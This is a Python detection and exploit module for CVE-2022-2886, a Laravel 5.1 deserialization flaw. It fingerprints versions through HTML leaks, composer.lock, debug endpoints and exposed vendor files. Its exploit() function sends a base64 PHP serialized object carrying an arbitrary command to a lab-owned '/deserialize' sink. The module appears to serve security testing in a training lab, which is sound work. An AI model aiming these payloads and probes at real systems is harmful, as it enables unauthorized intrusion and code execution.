#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import force_requested as _force_requested, metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2022-2886')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
    CVE-2022-2886 — Laravel 5.1 Deserialization of Untrusted Data (synthetic app-sink lab)

Summary:
    Laravel 5.1 is affected by a dangerous deserialization flaw (CWE-502)
    where attacker-supplied input may be deserialized, enabling DoS or RCE.

    LAB-SCOPED ACTIVE DETECTION:
     ✔ Identifies Laravel 5.1 installs using HTML/version leaks
     ✔ Confirms the repo's deliberately app-owned /deserialize sink when present
     ✔ Falls back to catalog/version reporting for ordinary Laravel targets
     ✘ Does not claim a generic framework-owned Laravel exploit path

    """

import base64
import re
import json
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Version patterns
LARAVEL_VERSION_PATTERN = re.compile(r"Laravel\s*v?(\d+\.\d+\.\d+)", re.IGNORECASE)

# Deserialization-related leakage patterns
DESERIALIZATION_PATTERNS = [
    r"unserialize\(",                     # PHP unserialize()
    r"Serialization of '.*' is not allowed",
    r"Unexpected data found",
    r"ErrorException.*unserialize",
    r"Illuminate\\.*\\Queue",             # Laravel 5.1 queue often triggers this
    r"Handler\.php",                      # 5.1 error handler
]

deserialize_re = re.compile("|".join(DESERIALIZATION_PATTERNS), re.IGNORECASE)

SYNTHETIC_ENDPOINT = "/deserialize"
SYNTHETIC_PROOF = "execution_model=actual PHP unserialize"
MARKER_CLASS = "LvcSyntheticMarker"
COMMAND_CLASS = "LvcSyntheticCommand"
DEFAULT_PARAMS = ["username", "password"]


def _safe_get(url, sess, timeout=6):
    try:
        return sess.get(url, timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None


def _extract_version(text: str):
    if not text:
        return None
    m = LARAVEL_VERSION_PATTERN.search(text)
    return m.group(1) if m else None


def _is_affected(version: str):
    if not version:
        return None
    return version.startswith("5.1")


def _php_string(value: str) -> str:
    raw = str(value).encode("utf-8")
    return f's:{len(raw)}:"{value}";'


def _php_object(class_name: str, props: dict[str, str]) -> str:
    body = "".join(_php_string(k) + _php_string(v) for k, v in props.items())
    return f'O:{len(class_name)}:"{class_name}":{len(props)}:{{{body}}}'


def _payload(command: str | None = None) -> str:
    if command:
        serialized = _php_object(COMMAND_CLASS, {"cmd": command})
    else:
        serialized = _php_object(MARKER_CLASS, {"marker": "actual PHP unserialize"})
    return base64.b64encode(serialized.encode("utf-8")).decode("ascii")


def _parse_params(options: dict | None) -> list[str]:
    raw = (options or {}).get("params")
    if raw is None:
        return list(DEFAULT_PARAMS)
    if isinstance(raw, str):
        params = [p.strip() for p in raw.split(",") if p.strip()]
    else:
        params = [str(p).strip() for p in raw if str(p).strip()]
    return params or list(DEFAULT_PARAMS)


def _parse_method(options: dict | None) -> str:
    method = str((options or {}).get("method") or "POST").upper()
    return method if method in {"GET", "POST"} else "POST"


def _send_payload(sess, base: str, method: str, params: list[str], payload: str, timeout=8):
    data = {name: payload for name in params}
    url = base.rstrip("/") + SYNTHETIC_ENDPOINT
    headers = {"Accept": "application/json"}
    if method == "GET":
        return sess.get(url, params=data, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
    return sess.post(url, data=data, headers=headers, timeout=timeout, verify=False, allow_redirects=True)


def _probe_synthetic_sink(sess, base: str):
    try:
        r = _send_payload(sess, base, "POST", ["_lvc_probe"], _payload(), timeout=6)
    except Exception:
        return None
    body = r.text or ""
    try:
        parsed = r.json()
    except Exception:
        parsed = {}
    return {
        "status_code": r.status_code,
        "body": body,
        "json": parsed if isinstance(parsed, dict) else {},
        "marker": SYNTHETIC_PROOF in body,
        "sink": "synthetic-app-unserialize" in body,
        "hardened": bool(parsed.get("hardened")) if isinstance(parsed, dict) else False,
    }


def _parse_composer_lock_version(body):
    if body is None:
        return None
    if isinstance(body, (bytes, bytearray)):
        body = body.decode("utf-8", "replace")
    try:
        data = json.loads(body)
    except Exception:
        return None
    for pkg in data.get("packages", []):
        if pkg.get("name") == "laravel/framework":
            ver = (pkg.get("version") or "").lstrip("vV")
            if ver:
                return ver
    return None


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2022-2886",
        "name": "Laravel 5.1 Deserialization (CWE-502)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "version_status": "unknown",
        "evidence": [],
        "preconditions": ["application-level unserialize() of attacker-controlled input"],
        "detection_methods": [],
        "error": None,
    }

    # ----------------------------------------------------------
    # Step 1 — Version leak on homepage or standard endpoints
    # ----------------------------------------------------------
    main = _safe_get(base, sess)
    if main is not None and main.text:
        ver = _extract_version(main.text)
        if ver:
            result["version"] = ver
            result["detection_methods"].append("version_html")
            result["evidence"].append(f"Laravel version leak: {ver}")

    leak_eps = ["/_debugbar", "/login", "/home", "/api"]
    if not result["version"]:
        for ep in leak_eps:
            r = _safe_get(base + ep, sess)
            if r is None:
                continue
            ver = _extract_version(r.text)
            if ver:
                result["version"] = ver
                result["detection_methods"].append(f"version_leak:{ep}")
                result["evidence"].append(f"Version found at {ep}: {ver}")
                break

    # ----------------------------------------------------------
    # Step 1b — composer.lock exposure
    # ----------------------------------------------------------
    if not result["version"]:
        composer = _safe_get(base + "/composer.lock", sess)
        if composer is not None and composer.status_code == 200:
            ver = _parse_composer_lock_version(composer.content)
            if ver:
                result["version"] = ver
                result["detection_methods"].append("composer_lock")
                result["evidence"].append(f"composer.lock version: {ver}")

    # ----------------------------------------------------------
    # Step 2 — Probe the lab-owned synthetic sink
    # ----------------------------------------------------------
    sink = _probe_synthetic_sink(sess, base)
    if sink and sink["marker"]:
        result["vulnerable"] = True
        result["status"] = "confirmed_vulnerable"
        result["verdict"] = "confirmed_vulnerable"
        result["proof_type"] = "safe_active"
        result["version_status"] = "vulnerable" if result["version"] and _is_affected(result["version"]) else result["version_status"]
        result["detection_methods"].append("synthetic_deserialize_sink")
        result["evidence"].append(
            "Synthetic app-owned /deserialize sink instantiated the marker gadget "
            f"({SYNTHETIC_PROOF})."
        )
        result["artifacts"] = {
            "endpoint": base + SYNTHETIC_ENDPOINT,
            "sink": "synthetic-app-unserialize",
            "hardened": False,
        }
        return result

    if sink and sink["sink"] and sink["hardened"]:
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["proof_type"] = "safe_sink"
        result["detection_methods"].append("synthetic_deserialize_sink_safe")
        result["evidence"].append(
            "Synthetic /deserialize endpoint is present, but hardened mode uses "
            "unserialize(..., ['allowed_classes' => false]) so the marker gadget is not instantiated."
        )
        result["artifacts"] = {
            "endpoint": base + SYNTHETIC_ENDPOINT,
            "sink": "synthetic-app-unserialize",
            "hardened": True,
        }

    # ----------------------------------------------------------
    # Step 3 — Check for deserialization-related error leaks
    # ----------------------------------------------------------
    debug_eps = [
        "/debug",
        "/?debug=1",
        "/?error=1",
        "/trigger-error",
        "/api/error",
    ]

    for ep in debug_eps:
        r = _safe_get(base + ep, sess)
        if result["verdict"] != "blocked_by_control" and r is not None and deserialize_re.search(r.text or ""):
            result["status"] = "surface_present"
            result["verdict"] = "surface_present"
            result["proof_type"] = "error_fingerprint"
            result["detection_methods"].append(f"deserialize_error:{ep}")
            result["evidence"].append("Unserialize()/Queue deserialization error leakage")
            break

    # ----------------------------------------------------------
    # Step 4 — Exposed vendor files (common on old Laravel 5.1)
    # ----------------------------------------------------------
    vendor_file = base + "/vendor/laravel/framework/src/Illuminate/Queue/Queue.php"
    r = _safe_get(vendor_file, sess)
    if result["verdict"] != "blocked_by_control" and r is not None and r.status_code == 200 and "unserialize" in (r.text or ""):
        result["status"] = "surface_present"
        result["verdict"] = "surface_present"
        result["proof_type"] = "source_disclosure"
        result["detection_methods"].append("vendor_file_exposed")
        result["evidence"].append("Exposed Queue.php containing unserialize() usage")

    # ----------------------------------------------------------
    # Step 5 — Version-based catalog fallback
    # ----------------------------------------------------------
    if result["version"]:
        if _is_affected(result["version"]):
            if result["verdict"] == "not_detected":
                result["status"] = "not_exploitable_refusal"
                result["verdict"] = "not_exploitable_refusal"
                result["proof_type"] = "catalog_version_only"
            result["version_status"] = "catalog_match"
            if result["proof_type"] == "catalog_version_only":
                result["disputed"] = True
                result["evidence"].append(
                    "Laravel 5.1.x matches the disputed CVE catalog condition, but no generic "
                    "framework-owned HTTP unserialize() sink is named or confirmed."
                )
        else:
            result["version_status"] = "patched"
            if result["verdict"] == "not_detected":
                result["status"] = "not_detected"

    return result


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Exploit the repo's synthetic app-owned unserialize() lab sink.

    This intentionally targets /deserialize and lab-only gadget classes. It proves the
    CVE precondition synthetically; it does not claim a generic Laravel framework route.
    """
    sess = session or http_config.get_auth_session()
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = target_url.rstrip("/")
    method = _parse_method(options)
    params = _parse_params(options)
    payload = _payload(command)
    endpoint = base + SYNTHETIC_ENDPOINT

    try:
        r = _send_payload(sess, base, method, params, payload)
    except Exception as exc:
        return {
            "cve": "CVE-2022-2886",
            "attempted": True,
            "success": False,
            "vuln_class": "rce" if command else "deserialization",
            "evidence": "",
            "detail": f"synthetic /deserialize request failed: {type(exc).__name__}: {exc}",
            "artifacts": {"endpoint": endpoint, "method": method, "params": params},
            "requires": ["synthetic app-owned /deserialize unserialize() sink"],
            "reason": "The module only exploits the local training sink; no generic Laravel framework sink is assumed.",
        }

    body = r.text or ""
    try:
        parsed = r.json()
    except Exception:
        parsed = {}

    command_output = ""
    if isinstance(parsed, dict):
        command_output = str(parsed.get("command_output") or "")

    if command:
        success = bool(command_output.strip()) or "uid=" in body
        evidence = command_output.strip() or body[:500]
        detail = "Synthetic app-level unserialize gadget executed the supplied command." if success else "Command gadget proof was not observed."
    else:
        success = SYNTHETIC_PROOF in body
        evidence = SYNTHETIC_PROOF if success else body[:500]
        detail = "Synthetic app-level unserialize sink instantiated the marker gadget." if success else "Marker gadget proof was not observed."

    return {
        "cve": "CVE-2022-2886",
        "attempted": True,
        "success": success,
        "vuln_class": "rce" if command else "deserialization",
        "evidence": evidence,
        "detail": detail,
        "artifacts": {
            "endpoint": endpoint,
            "method": method,
            "params": params,
            "status_code": r.status_code,
            "synthetic_lab": True,
            "hardened": bool(parsed.get("hardened")) if isinstance(parsed, dict) else None,
            "response_head": body[:500],
        },
        "requires": ["synthetic app-owned /deserialize unserialize() sink"],
        "reason": (
            "CVE-2022-2886 is not treated as a generic Laravel framework exploit. "
            "This proof is intentionally synthetic: the lab adds an application route "
            "that unserializes attacker-controlled parameters."
        ),
    }
